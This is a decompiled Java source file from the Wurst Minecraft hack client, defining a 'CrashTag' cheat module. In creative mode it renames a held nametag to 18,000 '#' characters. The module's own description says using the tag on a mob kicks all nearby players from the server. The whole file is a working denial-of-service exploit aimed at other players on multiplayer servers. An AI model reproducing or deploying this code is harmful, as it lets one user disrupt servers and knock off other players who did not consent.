// 
// Decompiled by Procyon v0.6.0
// 

package net.wurstclient.features.mods.items;

import net.minecraft.item.ItemStack;
import net.minecraft.client.gui.GuiScreen;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.client.gui.inventory.GuiInventory;
import net.minecraft.item.ItemNameTag;
import net.wurstclient.util.ChatUtils;
import net.wurstclient.Category;
import net.wurstclient.features.Bypasses;
import net.wurstclient.features.SearchTags;
import net.wurstclient.features.Hack;

@SearchTags({ "CrashNametag", "CrashTag", "crash item", "crash nametag", "crash tag" })
@Bypasses
public final class CrashTagMod extends Hack
{
    public CrashTagMod() {
        super("CrashTag", "Modifies a nametag so that it can kick people from the server.\nRight click a mob with the modified nametag to kick all nearby players.");
        this.setCategory(Category.ITEMS);
    }
    
    @Override
    public void onEnable() {
        if (!CrashTagMod.MC.player.abilities.creativeMode) {
            ChatUtils.error("Creative mode only.");
            this.setEnabled(false);
            return;
        }
        final ItemStack heldStack = CrashTagMod.MC.player.inventory.getCurrentItem();
        if (heldStack == null || !(heldStack.getItem() instanceof ItemNameTag)) {
            ChatUtils.error("You need a nametag in your hand.");
            this.setEnabled(false);
            return;
        }
        final StringBuilder stackName = new StringBuilder();
        for (int i = 0; i < 18000; ++i) {
            stackName.append('#');
        }
        heldStack.setStackDisplayName(stackName.toString());
        CrashTagMod.MC.openScreen(new GuiInventory(CrashTagMod.MC.player));
        CrashTagMod.MC.player.closeScreen();
        ChatUtils.message("Nametag modified.");
        this.setEnabled(false);
    }
}
